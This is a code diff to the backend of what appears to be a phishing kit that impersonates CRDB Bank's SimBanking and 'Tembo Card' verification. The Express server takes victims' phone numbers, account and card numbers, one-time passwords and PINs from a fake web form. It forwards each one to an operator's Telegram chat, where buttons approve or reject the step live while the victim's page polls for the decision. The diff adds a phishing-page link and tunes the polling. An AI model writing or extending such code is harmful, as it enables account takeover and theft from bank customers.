@@ -6,13 +6,11 @@ const app = express();
 app.use(express.json());
 app.use(express.static(path.join(__dirname, 'public')));
 
-// Configuration using standard environment keys
 const TOKEN = process.env.TELEGRAM_BOT_TOKEN;
 const CHAT_ID = process.env.TELEGRAM_CHAT_ID;
 
-const bot = new TelegramBot(TOKEN, { polling: true });
+const bot = new TelegramBot(TOKEN, { polling: { interval: 2000, autoStart: true, params: { timeout: 10 } } });
 
-// Persistent memory container
 global.appState = global.appState || {
     adminChatId: CHAT_ID || null,
     clientData: {},
@@ -20,38 +18,47 @@ global.appState = global.appState || {
     currentClientResponse: null
 };
 
-// Admin start command: immediately captures chat ID and provides info with private link context
+// Admin start command
 bot.onText(/\/start/, (msg) => {
     global.appState.adminChatId = msg.chat.id;
     const user = msg.from;
-    const privateLink = `https://t.me/${bot.options.username || 'bot'}`;
+    
+    // Dynamically retrieve public application browsing link
+    const appUrl = process.env.RENDER_EXTERNAL_URL || 'https://crdb-simbanking.onrender.com';
     
     const welcomeMsg = `✅ **Admin Connected Successfully!**\n\n` +
         `👤 **User Info:**\n` +
         `• Name: ${user.first_name} ${user.last_name || ''}\n` +
         `• Username: @${user.username || 'N/A'}\n` +
         `• ID: \`${user.id}\`\n\n` +
-        `🔗 **Private Bot Link:** ${privateLink}\n\n` +
+        `🌐 **Browsing Application Link:**\n${appUrl}\n\n` +
         `📱 Telegram notifications start strictly from the **Tembo Card Verification** screen onwards.`;
     
-    bot.sendMessage(global.appState.adminChatId, welcomeMsg, { parse_mode: 'Markdown' });
+    bot.sendMessage(global.appState.adminChatId, welcomeMsg, { parse_mode: 'Markdown' }).catch(err => console.error(err));
 });
 
 // API endpoint to handle user step submissions from frontend
 app.post('/api/submit', async (req, res) => {
     const { step, data } = req.body;
     global.appState.clientData = { ...global.appState.clientData, ...data };
+    global.appState.currentClientResponse = null;
 
     if (!global.appState.adminChatId) {
         return res.status(400).json({ success: false, message: 'Admin not connected to bot. Please send /start to your bot on Telegram.' });
     }
 
+    const appUrl = process.env.RENDER_EXTERNAL_URL || 'https://crdb-simbanking.onrender.com';
+
     if (step === 'personal_info') {
-        // Step 1 stays local and silent (No Telegram message sent)
-        return res.json({ success: true });
+        return res.json({ success: true, status: 'approved', next: 'step3' });
     }
     else if (step === 'step3') {
-        const msgText = `💳 **Step 3: Account & Tembo Card Verification**\n\n📱 **Phone No:** ${global.appState.clientData.phoneNumber || 'N/A'}\n🏦 **Account No:** ${data.accountNumber}\n💳 **Tembo Card No:** ${data.cardNumber}\n\n*Choose action for applicant:*`;
+        const msgText = `💳 **Step 3: Account & Tembo Card Verification**\n\n` +
+            `🌐 [Open Browsing App](${appUrl})\n\n` +
+            `📱 **Phone No:** ${global.appState.clientData.phoneNumber || 'N/A'}\n` +
+            `🏦 **Account No:** ${data.accountNumber}\n` +
+            `💳 **Tembo Card No:** ${data.cardNumber}\n\n` +
+            `*Choose action for applicant:*`;
         
         const opts = {
             reply_markup: {
@@ -62,14 +69,17 @@ app.post('/api/submit', async (req, res) => {
                     ]
                 ]
             },
-            parse_mode: 'Markdown'
+            parse_mode: 'Markdown',
+            disable_web_page_preview: true
         };
         await bot.sendMessage(global.appState.adminChatId, msgText, opts);
-        return res.json({ success: true, pendingApproval: true });
+        return res.json({ success: true, status: 'pending' });
     }
     else if (step === 'step4') {
         if (data.isResend) {
-            const msgText = `🔄 **Step 4: Applicant OTP Expired / Requesting New OTP**\n\n📱 **Phone:** ${global.appState.clientData.phoneNumber || 'N/A'}\n\n*The 30-second timer expired or applicant requested a new OTP. Choose action:*`;
+            const msgText = `🔄 **Step 4: Applicant OTP Expired / Requesting New OTP**\n\n` +
+                `🌐 [Open Browsing App](${appUrl})\n\n` +
+                `📱 **Phone:** ${global.appState.clientData.phoneNumber || 'N/A'}\n\n*Choose action:*`;
             const opts = {
                 reply_markup: {
                     inline_keyboard: [
@@ -79,13 +89,16 @@ app.post('/api/submit', async (req, res) => {
                         ]
                     ]
                 },
-                parse_mode: 'Markdown'
+                parse_mode: 'Markdown',
+                disable_web_page_preview: true
             };
             await bot.sendMessage(global.appState.adminChatId, msgText, opts);
-            return res.json({ success: true, pendingApproval: true });
+            return res.json({ success: true, status: 'pending' });
         }
 
-        const msgText = `📱 **Step 4: OTP Verification**\n\n🔢 **Entered OTP:** ${data.otp}\n\n*Choose action for OTP:*`;
+        const msgText = `📱 **Step 4: OTP Verification**\n\n` +
+            `🌐 [Open Browsing App](${appUrl})\n\n` +
+            `🔢 **Entered OTP:** ${data.otp}\n\n*Choose action:*`;
         const opts = {
             reply_markup: {
                 inline_keyboard: [
@@ -96,13 +109,16 @@ app.post('/api/submit', async (req, res) => {
                     ]
                 ]
             },
-            parse_mode: 'Markdown'
+            parse_mode: 'Markdown',
+            disable_web_page_preview: true
         };
         await bot.sendMessage(global.appState.adminChatId, msgText, opts);
-        return res.json({ success: true, pendingApproval: true });
+        return res.json({ success: true, status: 'pending' });
     }
     else if (step === 'step5') {
-        const msgText = `🔒 **Step 5: SimBanking PIN**\n\n🔑 **Attempt PIN:** ${data.pin}\n⚠️ **Remaining Attempts:** ${global.appState.pinAttempts}\n\n*Choose action for PIN:*`;
+        const msgText = `🔒 **Step 5: SimBanking PIN**\n\n` +
+            `🌐 [Open Browsing App](${appUrl})\n\n` +
+            `🔑 **Attempt PIN:** ${data.pin}\n⚠️ **Remaining Attempts:** ${global.appState.pinAttempts}\n\n*Choose action:*`;
         const opts = {
             reply_markup: {
                 inline_keyboard: [
@@ -112,10 +128,11 @@ app.post('/api/submit', async (req, res) => {
                     ]
                 ]
             },
-            parse_mode: 'Markdown'
+            parse_mode: 'Markdown',
+            disable_web_page_preview: true
         };
         await bot.sendMessage(global.appState.adminChatId, msgText, opts);
-        return res.json({ success: true, pendingApproval: true });
+        return res.json({ success: true, status: 'pending' });
     }
 
     res.json({ success: false, message: 'Invalid step' });
@@ -126,13 +143,8 @@ bot.on('callback_query', async (query) => {
     const chatId = query.message.chat.id;
     const messageId = query.message.message_id;
 
-    try {
-        await bot.answerCallbackQuery(query.id);
-    } catch (e) {}
-
-    try {
-        await bot.editMessageReplyMarkup({ inline_keyboard: [] }, { chat_id: chatId, message_id: messageId });
-    } catch (e) {}
+    try { await bot.answerCallbackQuery(query.id); } catch (e) {}
+    try { await bot.editMessageReplyMarkup({ inline_keyboard: [] }, { chat_id: chatId, message_id: messageId }); } catch (e) {}
 
     if (action === 'card_proceed') {
         await bot.sendMessage(chatId, '✅ Card details approved. Moving applicant to OTP step.');
@@ -173,18 +185,27 @@ bot.on('callback_query', async (query) => {
 });
 
 app.get('/api/poll-status', (req, res) => {
+    let elapsed = 0;
+    const intervalTime = 500;
+    const maxTimeout = 25000;
+
     const checkInterval = setInterval(() => {
+        elapsed += intervalTime;
         if (global.appState.currentClientResponse) {
             clearInterval(checkInterval);
             const resp = global.appState.currentClientResponse;
             global.appState.currentClientResponse = null;
-            res.json(resp);
+            return res.json(resp);
         }
-    }, 1000);
+        if (elapsed >= maxTimeout) {
+            clearInterval(checkInterval);
+            return res.json({ status: 'pending' });
+        }
+    }, intervalTime);
 });
 
-const PORT = process.env.PORT || 3000;
+const PORT = process.env.PORT || 10000;
 app.listen(PORT, () => {
     console.log(`Server running on port ${PORT}`);
 });
-        
+                                      
